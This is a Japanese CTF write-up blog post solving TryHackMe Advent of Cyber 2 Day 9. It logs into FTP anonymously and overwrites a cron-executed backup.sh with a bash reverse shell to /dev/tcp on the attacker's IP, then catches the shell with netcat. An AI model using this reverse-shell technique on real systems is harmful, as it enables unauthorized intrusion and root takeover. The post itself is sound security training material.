---
title: "【THM: TryHackMe】Advent of Cyber 2を解いてみた【Day9】"
date: 2021-12-31T09:29:19+09:00
description:
draft: false
hideToc: false
enableToc: true
enableTocContent: false
tocPosition: inner
tocLevels: ["h2", "h3", "h4"]
tags:
- TryHackMe
- WriteUP
categories:
- WriteUP
series:
- Advent of Cyber 2
image: /posts/2021/08/img/advent-of-cyber-2-thumbnail.png
---

## はじめに

今回は基本的なftpサーバへの接続方法やコマンドを学ぶ章になっています。
また、設定の不備によってftpからシェルを奪取する基本的な方法について学ぶことができます。

{{< notice warning "警告" >}}
本記事は全てのセキュリティに携わる人に向けて執筆しており、クラッキングを推奨するものではありません。本記事の手法を用いて、許可された環境以外で実行することは絶対にやめてください。
{{< /notice >}}

## Anyone can be Santa!

### Name the directory on the FTP server that has data accessible by the "anonymous" user

> FTPサーバー上の、anonymousユーザーがアクセスできるデータを持つディレクトリの名前

まずは`ftp`コマンドでインスタンスに接続します。

```bash
ftp 10.10.xxx.xxx
```

名前を聞かれるので`anonymous`ユーザでログインします。
そして中身を確認して1問目は終了です。

```bash
ftp>ls
```

### What script gets executed within this directory?

> このディレクトリの中で、どのようなスクリプトが実行されるのでしょうか？

先程のanonymousユーザがアクセスできるディレクトリにあるスクリプトを確認して終了です。

### What movie did Santa have on his Christmas shopping list?

> サンタがクリスマスの買い物リストに入れた映画は？

こちらもpublic配下にあるファイルから取得できます。

```bash
ftp>cd public
ftp>get xxxxxxxxxxxx.txt
```

### Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

> このスクリプトを悪意のあるデータを含むように再アップロードする（9.6節で行ったのと同じように。/root/flag.txtの内容を出力してください!

まずは、スクリプトをGetしてきます

```bash
ftp>get backup.sh
```

このバックアップスクリプトは定期的にcron実行されるのではないかとあたりをつけ、手元で中身を変えたあと、再度ftpサーバにputします

```bash:backup.sh
#!/bin/bash

bash -i >& /dev/tcp/10.11.xxx.xxx/4242 0>&1
```

このReverse Shellのスクリプトは[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)に記載されています。
IPアドレスは自分のIPアドレスを記載してください。

その後、書き換えたbackup.shをftpサーバ上に再度あげます

```bash
ftp>put backup.sh
```

定期的にbackup.shが実行されることを期待して、こちらでListenしておきます。

```bash
nc -lvnp 4242
```

1分ほど放置していると、無事bashが帰ってきていることを確認できます。
それでflagを取得して終了です。

## おわりに

今回は基本的なftpサーバへの接続方法やコマンド類、また設定の不備からシェルを奪取する方法について学びました。
今回の最後の問題から少し考えさせられるような問題が来ましたが、分からない部分は記述してある文章をよく読めば解けるようになっているので、OSCPライクなマシンの攻略を考えている人の最初のとっかかりになる問題だと思います。
